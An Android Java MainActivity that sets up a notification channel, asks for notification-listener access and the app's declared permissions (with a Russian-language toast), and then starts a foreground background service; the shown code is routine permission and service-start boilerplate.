package com.behavioralanalysis.service;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    public static final String CHANNEL_ID = "exampleServiceChannel";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        createNotificationChannel();

        setContentView(R.layout.activity_main);

        requestNotificationPermissionIfNeed();
        requestPermissionIfNeed();

        if (checkNotificationService() && getNotGrantedPermissions().isEmpty()) {
            Intent serviceIntent = new Intent(this, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } else {
            finish();
        }
    }

    private boolean checkNotificationService() {
        ContentResolver contentResolver = getContentResolver();
        String enabledNotificationListeners =
                Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
        String packageName = getPackageName();

        return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName);
    }

    private void requestNotificationPermissionIfNeed() {
        if (!checkNotificationService()) {
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        }
    }

    private List<String> getNotGrantedPermissions() {
        PackageInfo packageInfo = null;
        String[] permissions = new String[]{};
        Context context = getApplicationContext();
        try {
            packageInfo = getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
            permissions = packageInfo.requestedPermissions;
        } catch (PackageManager.NameNotFoundException ex) {
            ex.printStackTrace();
        }

        List<String> neededPermissions = new ArrayList<>();
        for (String permission : permissions) {
            int status = ContextCompat.checkSelfPermission(this, permission);
            if (status != PackageManager.PERMISSION_GRANTED) {
                neededPermissions.add(permission);
            }
        }

        return neededPermissions;
    }

    private void requestPermissionIfNeed() {
        List<String> neededPermissions = getNotGrantedPermissions();

        if (!neededPermissions.isEmpty()) {
            Toast.makeText(
                    this,
                    "Для работы приложения необходимо предоставить разрешения",
                    Toast.LENGTH_LONG
            ).show();

            ActivityCompat.requestPermissions(
                    this,
                    neededPermissions.toArray(new String[neededPermissions.size()]),
                    0
            );
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Example Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }
}